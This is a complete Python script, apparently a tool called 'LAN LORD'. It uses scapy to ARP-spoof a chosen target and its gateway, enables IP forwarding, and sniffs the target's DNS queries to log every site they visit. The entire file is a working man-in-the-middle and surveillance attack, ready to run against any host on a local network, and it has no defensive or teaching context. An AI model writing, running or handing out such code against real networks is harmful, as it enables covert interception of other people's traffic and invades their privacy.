import scapy.all as scapy
import time
import sys
import os
import threading

spoofing_active = True

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    os.system("powershell -Command \"Set-NetIPInterface -Forwarding Enabled\"")

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    try:
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except:
        pass
    return None

def spoof_thread(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    while spoofing_active:
        try:
            packet1 = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            packet2 = scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            scapy.sendp(packet1, verbose=False, iface=interface)
            scapy.sendp(packet2, verbose=False, iface=interface)
            time.sleep(2)
        except:
            break

def dns_monitor_callback(packet, target_ip):
    try:
        if packet.haslayer(scapy.DNSQR):
            if packet[scapy.IP].src == target_ip:
                query = packet[scapy.DNSQR].qname.decode("utf-8").rstrip(".")
                ignore = ["google", "gstatic", "microsoft", "azure"]
                if not any(x in query for x in ignore):
                    print(f"[+] SITE VISITED: {query}")
    except:
        pass

def restore(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    print("\n[*] Restoring network...")
    packet1 = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = scapy.Ether(dst=gateway_mac) / scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.sendp(packet1, count=4, verbose=False, iface=interface)
    scapy.sendp(packet2, count=4, verbose=False, iface=interface)

if __name__ == "__main__":
    print("\n" + "#"*50)
    print("[*] LAN LORD")
    print("#"*50)
    
    interface = scapy.conf.iface.name
    target_ip = input("\n[?] Enter Target IP Address: ")
    gateway_ip = input("[?] Enter Gateway IP Address: ")
    
    print(f"[*] Resolving MAC address for {target_ip}...")
    target_mac = get_mac(target_ip, interface)
    
    if not target_mac:
        print("[!] Could not resolve automatically.")
        target_mac = input(f"[?] Enter MAC address for {target_ip} manually: ")
    
    target_mac = target_mac.replace("-", ":")
    
    print("[*] Resolving Gateway MAC address...")
    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        gateway_mac = input(f"[?] Enter MAC address for Gateway ({gateway_ip}) manually: ").replace("-", ":")

    print(f"\n[+] TARGET: {target_ip} ({target_mac})")
    print(f"[+] GATEWAY: {gateway_ip} ({gateway_mac})")
    print("-" * 50)
    
    try:
        enable_ip_forwarding()
        
        t = threading.Thread(target=spoof_thread, args=(target_ip, target_mac, gateway_ip, gateway_mac, interface))
        t.daemon = True
        t.start()
        print("[*] Spoofing started. Monitoring traffic...\n")
        
        scapy.sniff(iface=interface, filter="udp port 53", store=False, prn=lambda x: dns_monitor_callback(x, target_ip))

    except KeyboardInterrupt:
        spoofing_active = False
        print("\n[!] Stopping...")
        if 'target_mac' in locals() and 'gateway_mac' in locals():
            restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        print("[+] Exited.")
    except Exception as e:
        print(f"[!] ERROR: {e}")